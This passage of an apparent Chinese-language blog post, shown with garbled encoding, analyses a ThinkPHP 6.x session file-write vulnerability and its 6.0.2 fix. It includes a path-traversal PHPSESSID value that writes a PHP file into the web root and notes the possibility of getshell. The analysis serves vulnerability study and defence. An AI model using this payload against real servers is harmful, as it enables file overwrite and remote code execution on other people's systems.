å…¶ä¸­å¢åŠ äº†å¯¹å‚æ•°<code>$id</code>çš„æ ¡éªŒï¼Œ<code>ctype_alnum</code>å‡½æ•°åˆ¤æ–­å‚æ•°æ˜¯å¦ä¸ºå­—æ¯æˆ–æ•°å­—çš„ç»„åˆ</p>
<h2 id="åˆ†æ">åˆ†æ</h2>
<p>åœ¨<code>src-&gt;think-&gt;session-&gt;Store.php</code>ä¸­</p>
<pre><code class="language-php">public function setId($id = null): void
{
    $this-&gt;id = is_string($id) &amp;&amp; strlen($id) === 32 ? $id : md5(microtime(true) . session_create_id());
}
</code></pre>
<p>æ‰¾åˆ°Store.phpä¸­è°ƒç”¨,æ‰¾åˆ°saveè¿™ä¸ªå‡½æ•°</p>
<pre><code class="language-php">public function save(): void
{
    $this-&gt;clearFlashData();

    $sessionId = $this-&gt;getId();

    if (!empty($this-&gt;data)) {
        $data = $this-&gt;serialize($this-&gt;data);

        $this-&gt;handler-&gt;write($sessionId, $data);
    } else {
        $this-&gt;handler-&gt;delete($sessionId);
    }
    $this-&gt;init = false;
}
</code></pre>
<p>å…·ä½“ä¼ å…¥<code>$this-&gt;handler-&gt;write()</code>ï¼Œç»§ç»­è·Ÿè¸ª<code>handler</code>ï¼Œå‘ç°åœ¨<code>__construct</code>ä¸­è¢«åˆå§‹åŒ–<br>
å…¨å±€æœç´¢ä¸€ä¸‹ï¼Œçœ‹å“ªäº›æ¥å£<code>implement</code>äº†è¿™ä¸ª<code>SessionHandlerInterface</code><br>
<img src="https://chriskalix.github.io/post-images/1592107766466.png" alt="" loading="lazy"><br>
åœ¨<code>cache.php</code>å’Œ<code>file.php</code>ä¸­å‘ç°è°ƒç”¨ï¼Œç”±äº<code>cache</code>ä¸­æ²¡æœ‰æ•æ„Ÿæ“ä½œçš„æ ·å­ï¼Œç›´æ¥çœ‹<code>file.php</code>,æ‰¾åˆ°<code>write</code></p>
<pre><code class="language-php">public function write(string $sessID, string $sessData): bool
{
    $filename = $this-&gt;getFileName($sessID, true);
    $data     = $sessData;
    if ($this-&gt;config['data_compress'] &amp;&amp; function_exists('gzcompress')) {
        //æ•°æ®å‹ç¼©
        $data = gzcompress($data, 3);
    }
    return $this-&gt;writeFile($filename, $data);
}
å…¶ä¸­writeFile
protected function writeFile($path, $content): bool
{
    return (bool) file_put_contents($path, $content, LOCK_EX);
}
</code></pre>
<p>$sessIDæ˜¯å¯æ§çš„ï¼Œé‚£ä¹ˆçœ‹ä¸€ä¸‹<code>getFileName</code>å‡½æ•°</p>
<pre><code class="language-php">protected function getFileName(string $name, bool $auto = false): string
{
    if ($this-&gt;config['prefix']) {
        // ä½¿ç”¨å­ç›®å½•
        $name = $this-&gt;config['prefix'] . DIRECTORY_SEPARATOR . 'sess_' . $name;
    } else {
        $name = 'sess_' . $name;
    }
    $filename = $this-&gt;config['path'] . $name;
    $dir      = dirname($filename);
    if ($auto &amp;&amp; !is_dir($dir)) {
        try {
            mkdir($dir, 0755, true);
        } catch (\Exception $e) {
            // åˆ›å»ºå¤±è´¥
        }
    }
    return $filename;
}
</code></pre>
<p>å¯ä»¥çœ‹åˆ°æ˜¯ç›´æ¥æ‹¼æ¥çš„ï¼Œæ²¡æœ‰ä»»ä½•è¿‡æ»¤æ–¹æ³•ï¼Œä¾¿ç›´æ¥è°ƒç”¨file_put_contentsäº†<br>
ç°åœ¨ä»SetIdå¾€ä¸Šï¼ŒæŸ¥æ‰¾SetIdçš„è°ƒç”¨ï¼Œé€šè¿‡å…¨å±€æœç´¢æ‰¾åˆ°src-&gt;think-&gt;middlewareçš„59è¡Œ</p>
<pre><code class="language-php">public function handle($request, Closure $next)
{
    // Sessionåˆå§‹åŒ–
    $varSessionId = $this-&gt;app-&gt;config-&gt;get('session.var_session_id');
    $cookieName   = $this-&gt;session-&gt;getName();
    if ($varSessionId &amp;&amp; $request-&gt;request($varSessionId)) {
        $sessionId = $request-&gt;request($varSessionId);
    } else {
        $sessionId = $request-&gt;cookie($cookieName);
    }
    if ($sessionId) {
        $this-&gt;session-&gt;setId($sessionId);
    }
    $this-&gt;session-&gt;init();
    $request-&gt;withSession($this-&gt;session);
    /** @var Response $response */
    $response = $next($request);
    $response-&gt;setSession($this-&gt;session);
    $this-&gt;app-&gt;cookie-&gt;set($cookieName, $this-&gt;session-&gt;getId());
    return $response;
}
</code></pre>
<p>é¦–å…ˆçœ‹åˆå§‹åŒ–ï¼Œ<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>v</mi><mi>a</mi><mi>r</mi><mi>S</mi><mi>e</mi><mi>s</mi><mi>s</mi><mi>i</mi><mi>o</mi><mi>n</mi><mi>I</mi><mi>d</mi><mi mathvariant="normal">ç”±</mi><mi mathvariant="normal">äº</mi><mi>s</mi><mi>e</mi><mi>s</mi><mi>s</mi><mi>i</mi><mi>o</mi><mi>n</mi><mi mathvariant="normal">.</mi><mi>v</mi><mi>a</mi><msub><mi>r</mi><mi>s</mi></msub><mi>e</mi><mi>s</mi><mi>s</mi><mi>i</mi><mi>o</mi><msub><mi>n</mi><mi>i</mi></msub><mi>d</mi><mi mathvariant="normal">æ²¡</mi><mi mathvariant="normal">æ‰¾</mi><mi mathvariant="normal">åˆ°</mi><mi mathvariant="normal">ï¼Œ</mi><mi mathvariant="normal">é»˜</mi><mi mathvariant="normal">è®¤</mi><mi mathvariant="normal">ä¸º</mi><mi mathvariant="normal">ç©º</mi><mi mathvariant="normal">å€¼</mi><mi mathvariant="normal">ã€‚</mi></mrow><annotation encoding="application/x-tex">varSessionIdç”±äºsession.var_session_idæ²¡æ‰¾åˆ°ï¼Œé»˜è®¤ä¸ºç©ºå€¼ã€‚</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mord mathdefault">s</span><span class="mord mathdefault">i</span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault">d</span><span class="mord cjk_fallback">ç”±</span><span class="mord cjk_fallback">äº</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mord mathdefault">s</span><span class="mord mathdefault">i</span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span><span class="mord">.</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">a</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">s</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mord mathdefault">s</span><span class="mord mathdefault">i</span><span class="mord mathdefault">o</span><span class="mord"><span class="mord mathdefault">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">d</span><span class="mord cjk_fallback">æ²¡</span><span class="mord cjk_fallback">æ‰¾</span><span class="mord cjk_fallback">åˆ°</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord cjk_fallback">é»˜</span><span class="mord cjk_fallback">è®¤</span><span class="mord cjk_fallback">ä¸º</span><span class="mord cjk_fallback">ç©º</span><span class="mord cjk_fallback">å€¼</span><span class="mord cjk_fallback">ã€‚</span></span></span></span>cookieNameä¸­è°ƒç”¨äº†session-&gt;getname();sessionçš„ç±»å‹ä¸ºSessionã€‚è·Ÿè¿›æ‰¾åˆ°src-&gt;think-&gt;session-&gt;Store.phpä¸‹æœ‰getNameå‡½æ•°ï¼Œé»˜è®¤å€¼ä¸ºPHPSESSID<br>
åˆ°è¿™é‡Œ$sessionIdå°±èµ°å‘äº†elseåˆ†æ”¯ï¼Œå› æ­¤å¯æ§å˜é‡å°±æ˜¯Cookieä¸­çš„PHPSESSID</p>
<h2 id="æ¼æ´çš„å‘ç”Ÿ">æ¼æ´çš„å‘ç”Ÿ</h2>
<p>æ ¹æ®åŒäº‹åšå®¢ä¸­çš„æ–‡ç« å¿«é€Ÿèµ·äº†ä¸€ä¸ªç¯å¢ƒã€‚åœ¨app/controller/index.phpä¸­å†™ä¸€ä¸ªå‡½æ•°ï¼Œå°†ä¼ å…¥çš„å˜é‡å†™å…¥sessionä¸­ï¼Œé‚£ä¹ˆå°±ä¼šå­˜åœ¨è¢«getshellçš„é£é™©<br>
å› ä¸ºç›®å‰sessionå¯æ§ï¼Œä½†æ˜¯é»˜è®¤sessionè·¯å¾„åœ¨/runtime/sessionä¸‹ï¼Œä¸”æœ‰ä¸€ä¸ªsess_çš„å‰ç¼€ã€‚ç„¶é¹…å°è¯•/../../æ˜¯å¯ä»¥ç©¿è¶Šè·¯å¾„çš„ï¼Œé‚£ä¹ˆå±å®³å°±æ‰©å¤§ä¸ºæ–‡ä»¶è¦†ç›–<br>
å¦‚æœå¼€å‘æ—¶å¯¼è‡´sessionä¸­çš„æŸä¸€å‚æ•°å¯æ§ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<pre><code class="language-php">public function mytest()
{
    $username = $_GET['name'];
    Session::set('username',$username);
    return 'success';
}
</code></pre>
<p>é‚£ä¹ˆå°±æœ‰å¯èƒ½å­˜åœ¨è¢«getshellçš„é£é™©</p>
<h2 id="æ€»ç»“ä¸å±å®³">æ€»ç»“ä¸å±å®³</h2>
<ol>
<li>å±å®³èŒƒå›´åœ¨thinkphp 6.xä¸”å°äº6.0.2</li>
<li>é»˜è®¤çš„å±å®³å°±æ˜¯ä»»æ„æ–‡ä»¶ä¸Šä¼ ï¼Œå¯èƒ½é€ æˆæ–‡ä»¶è¦†ç›–</li>
<li>åœ¨å¼€å‘ä¸å½“æ‰€å¯¼è‡´çš„æƒ…å†µä¸‹(åŠsessionä¸­å†…å®¹ç”¨æˆ·å¯æ§)ï¼Œé‚£ä¹ˆå¯èƒ½å¯¼è‡´getshell</li>
</ol>
<p>éªŒè¯æ–¹æ³•ï¼š<br>
å°†PHPSESSIDæ”¹ä¸º<code>/../../../public/././././123.php</code>ï¼Œå¦‚æœè®¿é—®123.phpæˆæœåˆ™è¯æ˜æ¼æ´å­˜åœ¨</p>
<p>6.0.2ä¸­çš„ä¿®å¤ï¼š<br>
ç›´æ¥åŠ ä¸Šctype_alnumäº†ï¼Œåªèƒ½æ˜¯æ•°å­—æˆ–è€…å­—æ¯ï¼Œå°±ä¸ä¼šå‡ºç°è¿™æ ·çš„é—®é¢˜</p>
<h2 id="å‚è€ƒæ–‡ç« ">å‚è€ƒæ–‡ç« </h2>
<p>https://blog.csdn.net/q851579181q/article/details/104344999<br>
https://xz.aliyun.com/t/7109</p>
]]></content>
    </entry>
</feed>